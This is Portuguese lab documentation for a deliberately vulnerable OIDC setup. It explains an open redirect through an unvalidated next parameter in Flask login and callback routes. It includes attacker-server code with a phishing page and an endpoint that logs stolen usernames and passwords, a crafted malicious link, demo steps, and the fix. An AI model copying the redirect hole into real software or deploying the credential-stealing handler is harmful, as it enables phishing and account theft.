# A-07 — Open Redirector no IdP / SP (OIDC)

## Descrição

O parâmetro `?next=` (ou `?redirect_uri=`) não validado permite que um atacante
construa uma URL de login legítima que, após autenticação bem-sucedida, redireciona
o utilizador para um domínio controlado pelo atacante.

O utilizador vê o URL do SP legítimo na barra de endereços antes de fazer login —
o que aumenta muito a credibilidade do ataque de phishing.

---

## Pré-requisitos

- SP1 a correr em `http://localhost:5001`
- Attacker Server a correr em `http://localhost:9999`
- `VULN_A07_OPEN_REDIRECT = True` em `sp1/config.py`

---

## Análise do Código

### 1. Flag de controlo — `sp1/config.py`

```python
# True  = sistema VULNERÁVEL
# False = mitigação ATIVA
VULN_A07_OPEN_REDIRECT = True
```

Esta flag é importada com `from config import *` e afecta dois pontos
do fluxo de autenticação: a rota `/login` (onde o parâmetro é lido)
e a rota `/callback` (onde o redirect é executado).

---

### 2. Rota `/login` — `sp1/app.py`

É aqui que o parâmetro `next` é lido do URL e guardado na sessão.
A vulnerabilidade está na **ausência de validação**:

```python
@app.route("/login")
def login():
    next_url = request.args.get("next", "")
    # Para: http://localhost:5001/login?next=http://localhost:9999/malicious
    # next_url = "http://localhost:9999/malicious"

    if VULN_A07_OPEN_REDIRECT:
        # VULNERÁVEL: guarda qualquer URL sem verificar se é interna
        session["next_url"] = next_url
        # session["next_url"] = "http://localhost:9999/malicious"
    else:
        # MITIGADO: só aceita paths internos
        if next_url.startswith("/") and not next_url.startswith("//"):
            session["next_url"] = next_url   # ex: "/profile" → aceite
        else:
            session["next_url"] = ""          # URL externa → ignorada

    redirect_uri = url_for("callback", _external=True)
    return oauth.keycloak.authorize_redirect(redirect_uri)
    # O utilizador é enviado para o Keycloak LEGÍTIMO
    # (o ataque ainda não aconteceu — o login é real)
```

**Porquê guardar na sessão e não no parâmetro do callback?**
O OIDC redirect (`/callback`) não pode transportar parâmetros arbitrários —
o Keycloak devolve apenas para o `redirect_uri` registado. A sessão é
o mecanismo para "lembrar" o `next` durante o fluxo OIDC.

---

### 3. Rota `/callback` — `sp1/app.py`

Após o Keycloak autenticar o utilizador e devolver o código,
o SP1 executa o redirect para o `next_url` guardado na sessão:

```python
@app.route("/callback")
def callback():
    token = oauth.keycloak.authorize_access_token()
    user_info = token.get("userinfo")

    # ... (A-09 e A-06 — ver respectivos documentos)

    session["user"]         = user_info
    session["access_token"] = token.get("access_token")

    # ---- A-07: Open Redirect ----
    next_url = session.pop("next_url", "")
    # next_url = "http://localhost:9999/malicious"  ← o valor injectado

    if VULN_A07_OPEN_REDIRECT and next_url:
        # VULNERÁVEL: redirect para qualquer URL, incluindo domínios externos
        return redirect(next_url)
        # HTTP 302  Location: http://localhost:9999/malicious
        # O utilizador foi autenticado com sucesso mas é enviado para o atacante

    # Se VULN=False ou next_url vazio: vai para o dashboard normal
    if VULN_A06_REFERRER_LEAK:
        return redirect(url_for("dashboard", token=token.get("access_token")))
    return redirect(url_for("index"))
```

**Sequência de execução com `VULN_A07 = True`:**
1. `session.pop("next_url")` → recupera `"http://localhost:9999/malicious"`
2. `if VULN_A07_OPEN_REDIRECT and next_url` → **True**
3. `return redirect(next_url)` → browser vai para o atacante
4. Os blocos A-06 nunca chegam a ser executados (return saiu antes)

---

### 4. Servidor do atacante — `attacker/app.py`

O atacante recebe o utilizador já autenticado:

```python
@app.route("/malicious")
def malicious():
    # O utilizador chegou aqui após autenticar no Keycloak REAL
    log_event(
        "A-07: Open Redirect",
        request.referrer or "directo",
        f"Utilizador aterrou na página de phishing. IP: {request.remote_addr}"
    )
    return render_template("phishing.html")
    # Mostra uma réplica do Keycloak pedindo login novamente

@app.route("/steal-credentials", methods=["POST"])
def steal_credentials():
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    log_event(
        "A-07: Credenciais Roubadas",
        "phishing form POST",
        f"username={username}  password={password}"
    )
    # Após roubar as credenciais, redireciona para o portal real
    # → a vítima pensa que o segundo login funcionou, não suspeita
    return redirect("http://localhost:5001/")
```

---

## Fluxo Completo do Ataque

```
VÍTIMA (browser)                SP1 :5001         KEYCLOAK :8080    ATACANTE :9999
      │                            │                    │                  │
      │  Clica no link malicioso:  │                    │                  │
      │  localhost:5001/login      │                    │                  │
      │  ?next=localhost:9999/malicious                 │                  │
      │── GET /login?next=... ─────►│                    │                  │
      │                            │  session["next_url"] = "http://...malicious"
      │◄── 302 → Keycloak ─────────│                    │                  │
      │                            │                    │                  │
      │── GET /auth?... ───────────────────────────────►│                  │
      │◄── 200 (ecrã de login REAL) ───────────────────│                  │
      │                            │                    │                  │
      │  [vítima introduz credenciais REAIS]             │                  │
      │── POST /login (credenciais) ───────────────────►│                  │
      │◄── 302 /callback?code=X ───────────────────────│                  │
      │                            │                    │                  │
      │── GET /callback?code=X ───►│                    │                  │
      │                            │── troca code ──────►│                  │
      │                            │◄── tokens ─────────│                  │
      │                            │                    │                  │
      │                            │  session.pop("next_url")              │
      │◄── 302 Location: http://localhost:9999/malicious (REDIRECT ABERTO) │
      │                            │                    │                  │
      │── GET /malicious ──────────────────────────────────────────────────►│
      │◄── 200 (página de phishing — réplica do Keycloak) ─────────────────│
      │                            │                    │                  │
      │  [vítima introduz credenciais novamente]         │                  │
      │── POST /steal-credentials ─────────────────────────────────────────►│
      │                            │                    │  [credenciais roubadas]
      │◄── 302 → http://localhost:5001/ ────────────────────────────────────│
      │                            │                    │                  │
      │── GET / ───────────────────►│                    │                  │
      │◄── dashboard (vítima pensa que tudo correu bem) │                  │
```

---

## Passos da Demonstração

### 1. Verificar configuração vulnerável

```python
# sp1/config.py
VULN_A07_OPEN_REDIRECT = True
```

### 2. Construir a URL maliciosa

O atacante envia à vítima este link (por email, mensagem, etc.):

```
http://localhost:5001/login?next=http://localhost:9999/malicious
```

Este URL parece legítimo — começa com o domínio do Portal A.

### 3. Abrir o Attacker Dashboard

Abre `http://localhost:9999/` em segundo plano para ver os eventos.

### 4. Clicar no link malicioso e fazer login

Acede ao URL acima. O SP1 inicia o fluxo OIDC normalmente com o Keycloak.
Faz login com `bob` / `bob123` — o login no Keycloak é **real**.

### 5. Observar o redirect

Após autenticação, o browser vai para `localhost:9999/malicious`.
A página de phishing pede login novamente — introduz quaisquer credenciais.

### 6. Verificar no Attacker Dashboard

Dois eventos aparecem:
- **A-07: Open Redirect** — utilizador aterrou na página
- **A-07: Credenciais Roubadas** — username e password capturados

---

## Mitigação — Análise do Código

```python
# sp1/config.py
VULN_A07_OPEN_REDIRECT = False
```

**Efeito na rota `/login`:**

```python
if VULN_A07_OPEN_REDIRECT:
    session["next_url"] = next_url          # ← NÃO executado

else:
    # Validação: só paths internos são aceites
    if next_url.startswith("/") and not next_url.startswith("//"):
        session["next_url"] = next_url
        # "/profile"   → aceite  (path interno)
        # "//"          → rejeitado (protocol-relative URL — pode apontar para externo)
    else:
        session["next_url"] = ""
        # "http://localhost:9999/malicious" → REJEITADO (URL absoluta externa)
        # "https://evil.com"               → REJEITADO
```

**Efeito na rota `/callback`:**

```python
next_url = session.pop("next_url", "")
# next_url = ""  (foi rejeitado na validação)

if VULN_A07_OPEN_REDIRECT and next_url:
    return redirect(next_url)   # ← NÃO executado (VULN=False)

# Fluxo normal: vai para o dashboard
return redirect(url_for("index"))
```

**Exemplos de validação:**

| `?next=` | `VULN=True` | `VULN=False` |
|----------|-------------|--------------|
| `/profile` | ✅ aceite | ✅ aceite (path interno) |
| `/admin` | ✅ aceite | ✅ aceite (path interno) |
| `http://evil.com` | ✅ aceite → **redirect para evil.com** | ❌ rejeitado → vai para `/` |
| `//evil.com/path` | ✅ aceite → **redirect para evil.com** | ❌ rejeitado (começa com `//`) |
| `http://localhost:9999/malicious` | ✅ aceite → **redirect para atacante** | ❌ rejeitado → vai para `/` |

---

## Referências

- [OWASP — Unvalidated Redirects and Forwards](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- [OAuth 2.0 — redirect_uri validation (RFC 6749 §10.6)](https://datatracker.ietf.org/doc/html/rfc6749#section-10.6)
